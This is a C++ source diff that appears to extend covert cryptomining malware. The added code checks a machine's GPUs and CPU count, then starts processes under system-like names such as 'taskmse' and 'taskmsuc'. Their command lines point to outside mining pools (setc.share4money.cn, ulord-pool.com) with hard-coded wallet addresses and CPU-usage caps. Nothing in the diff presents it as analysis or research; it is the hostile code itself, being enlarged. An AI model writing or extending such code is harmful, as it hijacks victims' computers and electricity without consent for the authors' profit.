@@ -28,13 +28,21 @@ bool RunEnvironment::CheckEnvironment()
 	{
 		m_vClient.push_back(L"taskmszn");
 	}
-	else if (CheckZACond())
+	if (CheckZACond())
 	{
 		m_vClient.push_back(L"taskmsza");
 	}
-	else if (CheckXCCond())
+	if (CheckXCCond())
 	{
 		m_vClient.push_back(L"taskmsxc");
+	}
+	if (CheckECond())
+	{
+		m_vClient.push_back(L"taskmse");
+	}
+	if (CheckUCCond())
+	{
+		m_vClient.push_back(L"taskmsuc");
 	}
 	if (m_vClient.size() > 0)
 	{
@@ -136,10 +144,55 @@ bool RunEnvironment::CheckZACond()
 	return false;
 }
 
+bool RunEnvironment::CheckECond()
+{
+#ifdef USERID_E
+	m_wstrWorkIDE = USERID_E;
+	vector<DISPLAY_CARD_INFO> vDISPLAY_CARD_INFO;
+	if (!GetUserDisplayCardInfo(vDISPLAY_CARD_INFO))
+	{
+		return false;
+	}
+	for (std::vector<DISPLAY_CARD_INFO>::const_iterator iter = vDISPLAY_CARD_INFO.begin(); iter != vDISPLAY_CARD_INFO.end(); iter++) {
+		TSDEBUG4CXX(L"[CheckZACond] Dispaly Card Info: name = "<< iter->name.c_str()<<L", vendor = "<<iter->vendor<<L", memory_size = "<<iter->memory_size);
+		if ((iter->vendor == vendor_t::amd || iter->vendor == vendor_t::nvidia) &&  iter->memory_size >= 3000000000)
+		{
+			m_uPlatFormID = iter->platformid;
+			if (g_bCheckName)
+			{
+				return CheckGPUName(iter->name);
+			}
+			else
+			{
+				TSDEBUG4CXX(L"can do E with out check name , Name = " << iter->name.c_str());
+				return true;
+			}
+		}
+	}
+#endif
+	return false;
+}
+
 bool RunEnvironment::CheckXCCond()
 {
 #ifdef USERID_X
 	m_wstrWorkIDX = USERID_X;
+	SYSTEM_INFO system_info;
+	GetSystemInfo(&system_info);
+	m_uTotalCpu = system_info.dwNumberOfProcessors; 
+	TSDEBUG4CXX(L"[CheckXCCond] m_uTotalCpu = "<< m_uTotalCpu);
+	if (m_uTotalCpu >= 2)
+	{
+		return true;
+	}
+#endif
+	return false;
+}
+
+bool RunEnvironment::CheckUCCond()
+{
+#ifdef USERID_U
+	m_wstrWorkIDU = USERID_U;
 	SYSTEM_INFO system_info;
 	GetSystemInfo(&system_info);
 	m_uTotalCpu = system_info.dwNumberOfProcessors; 
@@ -169,7 +222,7 @@ bool RunEnvironment::CheckGPUName(const std::string &strName)
 
 UINT RunEnvironment::GetCPUMinerThread()
 {
-	return m_uTotalCpu/2;
+	return m_uTotalCpu*2/4;
 }
 
 bool RunEnvironment::CheckIsForceNotMonitor()
@@ -199,7 +252,15 @@ bool RunEnvironment::StartAllClient(bool bFirst)
 		}
 		else if (*c_iter == L"taskmsxc")
 		{
-			_snwprintf(szParam, MAX_PATH, L"" ,m_wstrWorkIDX.c_str(), GetCPUMinerThread());
+			_snwprintf(szParam, MAX_PATH, L"-p %s -t %u" ,m_wstrWorkIDX.c_str(), GetCPUMinerThread());
+		}
+		else if (*c_iter == L"taskmse")
+		{
+			_snwprintf(szParam, MAX_PATH, L"--farm-recheck 2000 -G -P stratum1+tcp://0x5afef1843f798b19be8215b2fbb7471fd5684f98.%s@setc.share4money.cn:8108 --opencl-platform %u --cl-global-work 100", m_wstrWorkIDE.c_str(), m_uPlatFormID);
+		}
+		else if (*c_iter == L"taskmsuc")
+		{
+			_snwprintf(szParam, MAX_PATH, L"-o \"stratum+tcp://jrb5btn.ulord-pool.com:7100\" -u \"UhFdrhLxHhkjDgjaR31N7WTowSkzrWh65E.%s\" -p \"\" --max-cpu-usage 75", m_wstrWorkIDU.c_str());
 		}
 		else
 		{
